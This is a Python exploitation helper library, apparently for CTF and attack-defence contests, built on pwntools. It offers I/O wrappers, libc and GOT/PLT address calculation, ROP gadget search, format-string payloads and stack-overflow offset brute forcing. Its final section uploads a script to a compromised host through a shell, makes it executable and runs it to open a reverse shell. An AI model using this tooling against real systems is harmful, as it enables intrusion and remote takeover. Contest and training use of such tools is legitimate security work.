import os
import random
import subprocess
import sys
from pwn import *
from LibcSearcher import *
import inspect

'''
from evilblade import *
明知道是陷阱，
    为什么还要来。
'''
RED = '\033[91m'
GREEN = '\033[92m'
END = '\033[0m'
YELLOW = '\033[93m'
BLUE ='\033[94m'

n2b = lambda x: str(x).encode()
rv = lambda x: p.recv(x)
rl = lambda: p.recvline()
ru = lambda s: p.recvuntil(s)
sd = lambda s: p.send(s)
sl = lambda s: p.sendline(s)
sn = lambda s: sl(n2b(n))
sa = lambda t, s: p.sendafter(t, s)
sla = lambda t, s: p.sendlineafter(t, s)
sna = lambda t, n: sla(t, n2b(n))
ia = lambda: p.interactive()
rop64 = lambda r: flat([p64(x) for x in r])
rop32 = lambda r: flat([p32(x) for x in r])
uu64 = lambda data: u64(data.ljust(8, b'\x00'))
rall = lambda : p.recvall()

## Initialize world
def libset(libc_val):
    """
    Set libc for getting offset
    """
    global libc
    global libcpath
    libc = ELF(libc_val)
    libcpath = libc_val

def setup(p_val):
    """
    Set program and start
    """
    global p
    global elf
    global binpath
    binpath = p_val
    p = process(p_val)
    elf = ELF(p_val)

def set(p_val):
    """
    Set program without starting
    """
    global elf
    global binpath
    binpath = p_val
    elf = ELF(p_val)

def up(p_val):
    """
    Start program without setting
    """
    global p
    p = process(p_val)

def rsetup(mip, mport):
    """
    Set up remote connection (remote setup)
    """
    if args.P:
        global p
        p = remote(mip, mport)

## Receive world
def tet():
    """
    Test receiving data for a line 
    """
    p = globals()['p']
    r = ru('\n')
    dp("add", r)
    return r

def getx64(i, j):
    """
    Get 64bit and unpack it with debug info
    """
    if i != 0:
        r = (ru('\n'))[i:j]
        dp('getx64', r)
        r = u64(r.ljust(8, b'\0'))
        dpx("add", r)
        return r
    else:
        r = (ru('\n'))[:j]
        dp('getx64', r)
        r = u64(r.ljust(8, b'\0'))
        dpx("add", r)
        return r

def getx32(i, j):
    """
    Get 32bit and unpack it with debug info
    """
    if i != 0:
        r = (ru('\n'))[i:j]
        dp('getx32', r)
        r = u32(r.ljust(4, b'\0'))
        dpx("add", r)
        return r
    else:
        r = (ru('\n'))[:j]
        dp('getx32', r)
        r = u32(r.ljust(4, b'\0'))
        dpx("add", r)
        return r

def getx(i, j):
    """
    Get hex and unpack it with debug info
    """
    if i != 0:
        r = (ru('\n'))[i:j]
        dp('getx', r)
        r = int(r, 16)
        dpx("add", r)
        return r
    else:
        r = (ru('\n'))[:j]
        dp('getx', r)
        r = int(r, 16)
        dpx("add", r)
        return r

def getd(i, j):
    """
    Get decimal and unpack it with debug info
    """
    if i != 0:
        r = (ru('\n'))[i:j]
        dp('getd', r)
        r = int(r, 10)
        dpx("add", r)
        return r
    else:
        r = (ru('\n'))[:j]
        dp('getd', r)
        r = int(r, 10)
        dpx("add", r)
        return r

def tryre():
    """
    Try re for check if the connection is still alive
    """
    return p.recvrepeat(2)

def close():
    """
    Close connection
    """
    p.close()

'''
只攻不防，
    天下无双—————
        魔刀千刃。
'''
## Calculate world

def getbase(add, defname, *args):
    """
    Get base from the real address you got
    """
    base = add - libc.symbols[defname]
    for num in args:
        base -= num
    print('\nloading...')
    dpx("base",base)
    return base

def evgdb(*argv):
    """
    Set gdb (evil-gdb)
    """
    p = globals()['p']
    context.terminal = ['alacritty', '-e']
    # Modify terminal as per your environment
    # Replace 'alacritty' with the result of running 'echo $TERM'
    if args.G:
        if(len(argv)==0):
            gdb.attach(p)
        else:
            gdb.attach(p, *argv)

def symoff(defname, *args):
    """
    Calculate or set symblol's offset
    """
    if(len(args)>0):
        ba = args[0]
        print('\n----------------\nyour ', defname, 'offset is >>> ', hex(libc.sym[defname]), '\n---------------')
        print('\n----------------\nyour ', defname, 'is in >>> ', hex(ba+libc.sym[defname]), '\n---------------')
        return libc.sym[defname]+ba
    else:
        print('\n---------------\nyour ', defname, 'offset is >>> ', hex(libc.sym[defname]), '\n---------------')
        return libc.sym[defname]

def gotadd(defname, *args):
    """
    Get got's address
    """
    dpx(f"{defname} got's add", elf.got[defname])
    if (len(args) > 0):
        return elf.got[defname]+args[0]  # Handle PIE
    return elf.got[defname]

def pltadd(defname, *args):
    """
    Get plt's address
    """
    dpx(f"{defname} plt's add", elf.got[defname])
    if (len(args) > 0):
        return elf.plt[defname]+args[0]  # Handle PIE
    return elf.plt[defname]

def symadd(defname, *args):
    """
    Get sym's address
    """
    dpx(f"{defname} sym's add", elf.sym[defname])
    if (len(args) > 0):
        return elf.sym[defname]+args[0]  # Handle PIE
    return elf.sym[defname]

def gadget(instruction, index=-1, base=0, libc=0):
    """
    Get gadget's address
    instruction : the instruction/string you want to search
    index : to get the nth gadget, if -1 print all
    base : base address of the binary/libc
    libc : 0 for binary, 1 for libc
    """
    gadgets = []
    if libc == 1:
        global libcpath
        path = libcpath
    else:
        global binpath
        path = binpath
    try:
        command = f'ROPgadget --binary {path} --only \"{instruction}\" | grep \"0x\"'
        output = subprocess.check_output(command, shell=True)
        gadgets = output.decode().splitlines()
    except:
        try:
            command = f'ROPgadget --binary {path} | grep \"{instruction}\"'
            output = subprocess.check_output(command, shell=True)
            gadgets = output.decode().splitlines()
        except:
            try:
                gadgets.pop(0)
                command = f'ROPgadget --binary {path} --string \"{instruction}\"'
                output = subprocess.check_output(command, shell=True)
                gadgets = output.decode().splitlines()
            except:
                print(f"{RED}[-]{END} Something went wrong, please check your input")

    # 检查gadgets是否为空，如果是返回-1
    if len(gadgets) == 0:
        print(f"{RED}[-]{END} No gadgets found")
        return 0

    for gadget in gadgets:
        if ":" not in gadget:
            gadgets.remove(gadget)
            continue

    if index == -1:
        print(f"{RED}=============================================={END}",end="")
        print(f"\n{GREEN}[+]{END} Found {len(gadgets)} gadgets",end="")
        d(instruction)
        for gadget in gadgets:
            instruction_temp = instruction.replace("\\","")
            gadget = gadget.replace(instruction_temp, f"\033[31m{instruction_temp}\033[0m")
            print(gadget)
            # print(gadget.replace(":", f"#{gadgets.index(gadget)}").format())
        print(f"\n{YELLOW}[!]{END} Please input the index of the gadget you want to use")
        print(f"{RED}=============================================={END}")
        return 0
    print(gadgets[index])
    address = int(gadgets[index].split(':')[0], 16)
    gadget = gadgets[index].split(':')[1]
    print(f"\n{GREEN}[+]{END} Get \b{gadget} gadgets, its address is {hex(address)}\n")
    return address

def dp(name, data):
    """
    Print data with name
    """
    print(f'\n---------------\n{YELLOW}[o]{END} your', name, ' is >>> ', (data), '\n---------------')

def dpx(name, data):
    """
    Print hex data with name
    """
    print(f'\n---------------\n{YELLOW}[o]{END} your', name, ' is >>> ', hex(data), '\n---------------')

def d(data):
    """
    Print data without name you input ond get name from your local variable
    """
    frame = inspect.currentframe().f_back
    locals_dict = frame.f_locals

    for name, value in locals_dict.items():
        if value is data:
            print(f'\n---------------\n{YELLOW}[o]{END} your', name, 'is >>>', data, '\n---------------')
            break

def dx(data):
    """
    Hex print data without name you input and get name from your local variable
    """
    frame = inspect.currentframe().f_back
    locals_dict = frame.f_locals

    for name, value in locals_dict.items():
        if value is data:
            print(f'\n---------------\n{YELLOW}[o]{END} your', name, 'is >>>', hex(data), '\n---------------')
            break

'''
因为，   
    我有想要保护的人。
'''

## Library exploration world

def rlibset(defname, add):
    """
    Set remote libc
    """
    global rlibc
    rlibc = LibcSearcher(defname, add)

def rgetbase(add, defname, *args):
    """
    Get remote libc base from the real address you got
    """
    base = add - rlibc.dump(defname)
    for num in args:
        base -= num
    print('\nloading...')
    print('\n----------------\nget!your base is >>> ', hex(base), '\n--------------')
    return base

def rsymoff(defname, *args):
    """
    Calculate or set remote symblol's offset
    """
    if(len(args)>0):
        ba = args[0]
        print('\n----------------\nyour ', defname, 'offset is >>> ', hex(rlibc.dump(defname)), '\n---------------')
        print('\n----------------\nyour ', defname, 'is in >>> ', hex(ba+rlibc.dump(defname)), '\n---------------')
        return rlibc.dump(defname)+ba
    else:
        print('\n---------------\nyour ', defname, 'offset is >>> ', hex(rlibc.dump(defname)), '\n---------------')
        return rlibc.dump(defname)

# Attack world

def fmt(offset, begin, end, size, written):
    """
    Format string exploit
    """
    payload = fmtstr_payload(offset, {begin: end}, write_size=size, numbwritten=written)
    return payload

'''
    offset（int） - 您控制的第一个格式化程序的偏移量
    字典（dict） - 被写入地址对应->写入的数据，可多个对应{addr: value, addr2: value2}
    numbwritten（int） - printf函数已写入的字节数
    write_size（str） - 必须是byte，short或int。告诉您是否要逐字节写入，短按short或int（hhn，hn或n）
    注意还有ln，lln等用法
'''
def re(time):
    """
    Try to receive
    """
    p.recvS(timeout=time)  # Used for brute-forcing
def clo():
    """
    Close connection
    """
    p.close()

'''
while True:
    ...
    if re:
        print('pwned!get your flag here:', re)
        exit(0)
    p.close()以udi
'''

def string(strings, *args):
    """
    Get str's address
    """
    global libc
    result = next(libc.search(strings))
    dpx(f"\"{strings}\"'s offset", result)
    if (len(args) > 0):
        return result+args[0]  # Handle PIE
    return result

got = gotadd
plt = pltadd
off = symoff
sym = symadd
gg = gadget

def execute_script(script_path, timeout, mouse=None):
    try:
        # 在脚本文件中插入赋值语句
        if mouse is not None:
            with open(script_path, 'r+') as f:
                content = f.read()
                f.seek(0, 0)
                f.write(f"mouse = {mouse}\n" + content)
        
        process = subprocess.Popen(['python3', script_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, text=True)
        sleep(timeout)
        output, errors = process.communicate(input='l')  
        
        return_code = process.returncode
        
        return output, errors, return_code
    finally:
        if mouse is not None:
            with open(script_path, 'r+') as f:
                lines = f.readlines()
                f.seek(0)
                for line in lines:
                    if not line.startswith(f"mouse = {mouse}"):
                        f.write(line)
                f.truncate()


import time

def cyccat(your_exp, offset_you_know, overflow_key, timeout, debug=0):
    """
    get offset of stackoverflow autoly

    usage:
    for first, you must code a "mouse" as a variable in the input in your exploit script for testing the offset
    like:
    sd(mouse)

    and next you should give a request, to check it if EOF
    like:
    rv()
    or http request

    your_exp : your exploit script
    offset_you_know : the offset can make overflow you know, can be larger than the real offset you guess
    overflow_key : the key words you know can make overflow, if it's 0, it means EOF
    time : the time you want to wait for the response
    debug : if debug is 1, it will print the debug info
    """
    min_range = 0
    max_range = offset_you_know
    start_time = time.time()
    rotating_symbols = ['.', 'o', '0', 'O']
    rotating_index = 0
    last_print_time = start_time
    while min_range <= max_range:
        guess = random.randint(min_range, max_range)
        mouse = b"N"*guess
        out, err, return_code = execute_script(your_exp, timeout, mouse=mouse)

        if overflow_key == 0:
            condition_met = "Got EOF" in out or "Got EOF" in err or "EOFError" in out or "EOFError" in err
        else:
            condition_met = overflow_key in out or overflow_key in err

        if condition_met:
            max_range = guess - 1
        else:
            min_range = guess + 1

        if debug:
            print(f"{YELLOW}----------------------{END}")
            print(f"{YELLOW}|{END}    debug info       {YELLOW}|{END}")
            print(f"{YELLOW}----------------------{END}")
            print(f"{BLUE}[!]{END} debug output: {out}")
            print(f"{BLUE}[!]{END} debug errors: {err}")

            if condition_met : print(f"{BLUE}[!]{END} too large")
            else : print(f"{BLUE}[!]{END} too small")
            print(f"{BLUE}[!]{END} min_range: {min_range}, max_range: {max_range}")
        
        # 检查是否到达打印时间间隔
        current_time = time.time()
        if current_time - last_print_time >= 0.1:  # 设置时间间隔为0.1秒
            # 打印当前进度
            rotating_symbol = rotating_symbols[rotating_index % len(rotating_symbols)]
            rotating_index += 1
            progress = (max_range - min_range) / offset_you_know * 100
            print(f"{YELLOW}[{rotating_symbol}]{END} Progress: {100 - 0.05 - progress:.2f}%\r", end='', flush=True)
            last_print_time = current_time

    end_time = time.time()
    elapsed_time = end_time - start_time
    print(f"{YELLOW}[{rotating_symbol}]{END} Progress: 100.00%\r", end='', flush=True)
    print(f"\n[!] Time elapsed: {elapsed_time:.2f} seconds")
    #min_range-1等于offset_you_know或者-1：
    if min_range-1 == offset_you_know or max_range == -1:
        print(f"{RED}[-]{END} Not found! Please check your overflow key or offset, and try again")
    else:
        print(f"{GREEN}[+]{END} Found! The appropriate payload size: {min_range-1} (just let the program crash)")


def congra():
    """
    a congratulation message
    """
    print(f"{GREEN}[+]{END} Pwned! Go ahead")

#awd world
#千刃破
def upload(source, dest, ip=0):
    '''
    Upload file to the server
    '''
    sleep(1)
    sl('echo "S3vn"')
    try:
        ru('S3vn')
    except:
        print(f"{RED}[-]{END} Upload Failed")
        clo()
        return 0
    else:
        print(f"{GREEN}[+]{END} Upload Start")
    pa = '/bin/echo -ne "'
    pa += get_file_hex(source, ip)
    pa += '" > ' + dest
    dp("Upload File",pa)
    sl(pa)
    print(f"{GREEN}[+]{END} Upload Done")
    return 1

def get_file_hex(source, ip=0):
    '''
    In your exploit script, if N1nE is there will be replace to ip + 30000
    let the N1nE to be the port of reverse shell
    '''
    fd = open(source, 'rb')
    da = fd.read()
    fd.close()
    if ip != 0:
        da = da.replace(b"N1nE", str(int(ip) + 30000).encode())
    h = ''
    for c in da:
        h += '\\x'    
        h += "%02x" % c
    return h

def reverse_shell(shell, ip="0", index=3):
    '''
    If there is target like 10.10.10.1-10.10.10.127
    get ip as 1-127 to get the reverse_shell
    if there is ip, it will be stripped
    '''
    if "." in ip:
        ip = ip.split(".")
        ip = ip[index]

    if "init" in shell:
        ip=ip+10000
        nice = upload(shell,"/tmp/init.sh", ip)
        if nice == 0:
            return 0
        sl("chmod +x /tmp/init.sh && /tmp/init.sh")
        print(f"{GREEN}[+]{END} Reverse shell in port {int(ip) + 30000} is ready")
        ia()
        # sl("exit")
    else:
        nice = upload(shell,"/tmp/service.sh", ip)
        if nice == 0:
            return 0
        sl("chmod +x /tmp/service.sh && /tmp/service.sh &")
        print(f"{GREEN}[+]{END} Reverse shell in port {int(ip) + 30000} is ready")
        ia()
    # print(f"{GREEN}[+]{END} Reverse shell in port {int(ip) + 30000} is ready")
    clo()


